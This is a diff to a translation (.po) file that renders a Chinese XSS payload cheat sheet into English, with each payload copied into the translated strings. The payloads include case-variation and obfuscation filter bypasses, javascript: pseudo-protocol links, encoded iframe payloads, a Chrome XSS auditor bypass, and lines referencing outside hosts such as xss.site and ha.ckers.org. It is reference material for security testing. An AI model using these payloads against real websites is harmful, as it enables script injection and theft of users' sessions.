@@ -20,291 +20,297 @@ msgstr ""
 
 #: ../../source/vuln/xss/payload.rst:2
 msgid "Payload"
-msgstr ""
+msgstr "Payload"
 
 #: ../../source/vuln/xss/payload.rst:5
 msgid "常用"
-msgstr ""
+msgstr "Common Payloads"
 
 #: ../../source/vuln/xss/payload.rst:7
 msgid "``<script>alert(/xss/)</script>``"
-msgstr ""
+msgstr "``<script>alert(/xss/)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:8
 msgid "``<svg onload=alert(document.domain)>``"
-msgstr ""
+msgstr "``<svg onload=alert(document.domain)>``"
 
 #: ../../source/vuln/xss/payload.rst:9
 msgid "``<img src=document.domain onerror=alert(document.domain)>``"
-msgstr ""
+msgstr "``<img src=document.domain onerror=alert(document.domain)>``"
 
 #: ../../source/vuln/xss/payload.rst:10
 msgid "``<M onmouseover=alert(document.domain)>M``"
-msgstr ""
+msgstr "``<M onmouseover=alert(document.domain)>M``"
 
 #: ../../source/vuln/xss/payload.rst:11
 msgid "``<marquee onscroll=alert(document.domain)>``"
-msgstr ""
+msgstr "``<marquee onscroll=alert(document.domain)>``"
 
 #: ../../source/vuln/xss/payload.rst:12
 msgid "``<a href=javascript:alert(document.domain)>M</a>``"
-msgstr ""
+msgstr "``<a href=javascript:alert(document.domain)>M</a>``"
 
 #: ../../source/vuln/xss/payload.rst:13
 msgid "``<body onload=alert(document.domain)>``"
-msgstr ""
+msgstr "``<body onload=alert(document.domain)>``"
 
 #: ../../source/vuln/xss/payload.rst:14
 msgid "``<details open ontoggle=alert(document.domain)>``"
-msgstr ""
+msgstr "``<details open ontoggle=alert(document.domain)>``"
 
 #: ../../source/vuln/xss/payload.rst:15
 msgid "``<embed src=javascript:alert(document.domain)>``"
-msgstr ""
+msgstr "``<embed src=javascript:alert(document.domain)>``"
 
 #: ../../source/vuln/xss/payload.rst:18
 msgid "大小写绕过"
-msgstr ""
+msgstr "Case-Variation Bypass"
 
 #: ../../source/vuln/xss/payload.rst:20 ../../source/vuln/xss/payload.rst:37
 msgid "``<script>alert(1)</script>``"
-msgstr ""
+msgstr "``<script>alert(1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:21
 msgid "``<sCrIpT>alert(1)</sCrIpT>``"
-msgstr ""
+msgstr "``<sCrIpT>alert(1)</sCrIpT>``"
 
 #: ../../source/vuln/xss/payload.rst:22
 msgid "``<ScRiPt>alert(1)</ScRiPt>``"
-msgstr ""
+msgstr "``<ScRiPt>alert(1)</ScRiPt>``"
 
 #: ../../source/vuln/xss/payload.rst:23
 msgid "``<sCrIpT>alert(1)</ScRiPt>``"
-msgstr ""
+msgstr "``<sCrIpT>alert(1)</ScRiPt>``"
 
 #: ../../source/vuln/xss/payload.rst:24
 msgid "``<ScRiPt>alert(1)</sCrIpT>``"
-msgstr ""
+msgstr "``<ScRiPt>alert(1)</sCrIpT>``"
 
 #: ../../source/vuln/xss/payload.rst:25
 msgid "``<img src=1 onerror=alert(1)>``"
-msgstr ""
+msgstr "``<img src=1 onerror=alert(1)>``"
 
 #: ../../source/vuln/xss/payload.rst:26
 msgid "``<iMg src=1 oNeRrOr=alert(1)>``"
-msgstr ""
+msgstr "``<iMg src=1 oNeRrOr=alert(1)>``"
 
 #: ../../source/vuln/xss/payload.rst:27
 msgid "``<ImG src=1 OnErRoR=alert(1)>``"
-msgstr ""
+msgstr "``<ImG src=1 OnErRoR=alert(1)>``"
 
 #: ../../source/vuln/xss/payload.rst:28
 msgid "``<img src=1 onerror=\"alert(&quot;M&quot;)\">``"
-msgstr ""
+msgstr "``<img src=1 onerror=\"alert(&quot;M&quot;)\">``"
 
 #: ../../source/vuln/xss/payload.rst:30
 msgid "``<marquee onscroll=alert(1)>``"
-msgstr ""
+msgstr "``<marquee onscroll=alert(1)>``"
 
 #: ../../source/vuln/xss/payload.rst:31
 msgid "``<mArQuEe OnScRoLl=alert(1)>``"
-msgstr ""
+msgstr "``<mArQuEe OnScRoLl=alert(1)>``"
 
 #: ../../source/vuln/xss/payload.rst:32
 msgid "``<MaRqUeE oNsCrOlL=alert(1)>``"
-msgstr ""
+msgstr "``<MaRqUeE oNsCrOlL=alert(1)>``"
 
 #: ../../source/vuln/xss/payload.rst:35
 msgid "各种alert"
-msgstr ""
+msgstr "Alert Variants"
 
 #: ../../source/vuln/xss/payload.rst:38
 msgid "``<script>confirm(1)</script>``"
-msgstr ""
+msgstr "``<script>confirm(1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:39
 msgid "``<script>prompt(1)</script>``"
-msgstr ""
+msgstr "``<script>prompt(1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:40
 msgid "``<script>alert('1')</script>``"
-msgstr ""
+msgstr "``<script>alert('1')</script>``"
 
 #: ../../source/vuln/xss/payload.rst:41
 msgid "``<script>alert(\"1\")</script>``"
-msgstr ""
+msgstr "``<script>alert(\"1\")</script>``"
 
 #: ../../source/vuln/xss/payload.rst:42
 msgid "``<script>alert`1`</script>``"
-msgstr ""
+msgstr "``<script>alert`1`</script>``"
 
 #: ../../source/vuln/xss/payload.rst:43
 msgid "``<script>(alert)(1)</script>``"
-msgstr ""
+msgstr "``<script>(alert)(1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:44
 msgid "``<script>a=alert,a(1)</script>``"
-msgstr ""
+msgstr "``<script>a=alert,a(1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:45
 msgid "``<script>[1].find(alert)</script>``"
-msgstr ""
+msgstr "``<script>[1].find(alert)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:46
 msgid "``<script>top[\"al\"+\"ert\"](1)</script>``"
-msgstr ""
+msgstr "``<script>top[\"al\"+\"ert\"](1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:47
 msgid "``<script>top[\"a\"+\"l\"+\"e\"+\"r\"+\"t\"](1)</script>``"
-msgstr ""
+msgstr "``<script>top[\"a\"+\"l\"+\"e\"+\"r\"+\"t\"](1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:48
 msgid "``<script>top[/al/.source+/ert/.source](1)</script>``"
-msgstr ""
+msgstr "``<script>top[/al/.source+/ert/.source](1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:49
 msgid "``<script>top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)</script>``"
-msgstr ""
+msgstr "``<script>top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)</script>``"
 
 #: ../../source/vuln/xss/payload.rst:52
 msgid "伪协议"
-msgstr ""
+msgstr "Pseudo-Protocols"
 
 #: ../../source/vuln/xss/payload.rst:54
 msgid "``<a href=javascript:/0/,alert(%22M%22)>M</a>``"
-msgstr ""
+msgstr "``<a href=javascript:/0/,alert(%22M%22)>M</a>``"
 
 #: ../../source/vuln/xss/payload.rst:55
 msgid "``<a href=javascript:/00/,alert(%22M%22)>M</a>``"
-msgstr ""
+msgstr "``<a href=javascript:/00/,alert(%22M%22)>M</a>``"
 
 #: ../../source/vuln/xss/payload.rst:56
 msgid "``<a href=javascript:/000/,alert(%22M%22)>M</a>``"
-msgstr ""
+msgstr "``<a href=javascript:/000/,alert(%22M%22)>M</a>``"
 
 #: ../../source/vuln/xss/payload.rst:57
 msgid "``<a href=javascript:/M/,alert(%22M%22)>M</a>``"
-msgstr ""
+msgstr "``<a href=javascript:/M/,alert(%22M%22)>M</a>``"
 
 #: ../../source/vuln/xss/payload.rst:61
 msgid "Chrome XSS auditor bypass"
-msgstr ""
+msgstr "Chrome XSS Auditor Bypass"
 
 #: ../../source/vuln/xss/payload.rst:63
 #, python-format
 msgid "``?param=https://&param=@z.exeye.io/import%20rel=import%3E``"
-msgstr ""
+msgstr "``?param=https://&param=@z.exeye.io/import%20rel=import%3E``"
 
 #: ../../source/vuln/xss/payload.rst:64
 msgid "``<base href=javascript:/M/><a href=,alert(1)>M</a>``"
-msgstr ""
+msgstr "``<base href=javascript:/M/><a href=,alert(1)>M</a>``"
 
 #: ../../source/vuln/xss/payload.rst:65
 msgid "``<base href=javascript:/M/><iframe src=,alert(1)></iframe>``"
-msgstr ""
+msgstr "``<base href=javascript:/M/><iframe src=,alert(1)></iframe>``"
 
 #: ../../source/vuln/xss/payload.rst:68
 msgid "长度限制"
-msgstr ""
+msgstr "Length Limits"
 
 #: ../../source/vuln/xss/payload.rst:77
 msgid "jquery sourceMappingURL"
-msgstr ""
+msgstr "jQuery sourceMappingURL"
 
 #: ../../source/vuln/xss/payload.rst:78
 msgid "``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``"
-msgstr ""
+msgstr "``</textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>``"
 
 #: ../../source/vuln/xss/payload.rst:81
 msgid "图片名"
-msgstr ""
+msgstr "Image Filename"
 
 #: ../../source/vuln/xss/payload.rst:82
 msgid "``\"><img src=x onerror=alert(document.cookie)>.gif``"
-msgstr ""
+msgstr "``\"><img src=x onerror=alert(document.cookie)>.gif``"
 
 #: ../../source/vuln/xss/payload.rst:85
 msgid "过期的payload"
-msgstr ""
+msgstr "Outdated Payloads"
 
 #: ../../source/vuln/xss/payload.rst:86
 msgid "src=javascript:alert基本不可以用"
-msgstr ""
+msgstr "src=javascript:alert is generally no longer usable"
 
 #: ../../source/vuln/xss/payload.rst:87
 msgid "css expression特性只在旧版本ie可用"
-msgstr ""
+msgstr "The CSS expression feature is only available in old versions of IE"
 
 #: ../../source/vuln/xss/payload.rst:90
 msgid "css"
-msgstr ""
+msgstr "CSS"
 
 #: ../../source/vuln/xss/payload.rst:99
 msgid "markdown"
-msgstr ""
+msgstr "Markdown"
 
 #: ../../source/vuln/xss/payload.rst:113
 msgid "iframe"
-msgstr ""
+msgstr "iframe"
 
 #: ../../source/vuln/xss/payload.rst:125
 msgid "``<iframe src=javascript:alert(1)></iframe>``"
-msgstr ""
+msgstr "``<iframe src=javascript:alert(1)></iframe>``"
 
 #: ../../source/vuln/xss/payload.rst:126
 msgid ""
 "``<iframe src=\"data:text/html,<iframe "
 "src=javascript:alert('M')></iframe>\"></iframe>``"
 msgstr ""
+"``<iframe src=\"data:text/html,<iframe "
+"src=javascript:alert('M')></iframe>\"></iframe>``"
 
 #: ../../source/vuln/xss/payload.rst:127
 msgid ""
 "``<iframe "
 "src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>``"
 msgstr ""
+"``<iframe "
+"src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+></iframe>``"
 
 #: ../../source/vuln/xss/payload.rst:128
 msgid "``<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>``"
-msgstr ""
+msgstr "``<iframe srcdoc=<svg/o&#x6E;load&equals;alert&lpar;1)&gt;></iframe>``"
 
 #: ../../source/vuln/xss/payload.rst:129
 msgid "``<iframe src=https://baidu.com width=1366 height=768></iframe>``"
-msgstr ""
+msgstr "``<iframe src=https://baidu.com width=1366 height=768></iframe>``"
 
 #: ../../source/vuln/xss/payload.rst:130
 msgid "``<iframe src=javascript:alert(1) width=1366 height=768></iframe``"
-msgstr ""
+msgstr "``<iframe src=javascript:alert(1) width=1366 height=768></iframe``"
 
 #: ../../source/vuln/xss/payload.rst:133
 msgid "form"
-msgstr ""
+msgstr "form"
 
 #: ../../source/vuln/xss/payload.rst:135
 msgid "``<form action=javascript:alert(1)><input type=submit>``"
-msgstr ""
+msgstr "``<form action=javascript:alert(1)><input type=submit>``"
 
 #: ../../source/vuln/xss/payload.rst:136
 msgid "``<form><button formaction=javascript:alert(1)>M``"
-msgstr ""
+msgstr "``<form><button formaction=javascript:alert(1)>M``"
 
 #: ../../source/vuln/xss/payload.rst:137
 msgid "``<form><input formaction=javascript:alert(1) type=submit value=M>``"
-msgstr ""
+msgstr "``<form><input formaction=javascript:alert(1) type=submit value=M>``"
 
 #: ../../source/vuln/xss/payload.rst:138
 msgid "``<form><input formaction=javascript:alert(1) type=image value=M>``"
-msgstr ""
+msgstr "``<form><input formaction=javascript:alert(1) type=image value=M>``"
 
 #: ../../source/vuln/xss/payload.rst:139
 msgid "``<form><input formaction=javascript:alert(1) type=image src=1>``"
-msgstr ""
+msgstr "``<form><input formaction=javascript:alert(1) type=image src=1>``"
 
 #: ../../source/vuln/xss/payload.rst:142
 msgid "meta"
-msgstr ""
+msgstr "meta"
 
 #: ../../source/vuln/xss/payload.rst:144
 msgid ""
 "``<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; "
 "REL=stylesheet\">``"
 msgstr ""
+"``<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; "
+"REL=stylesheet\">``"
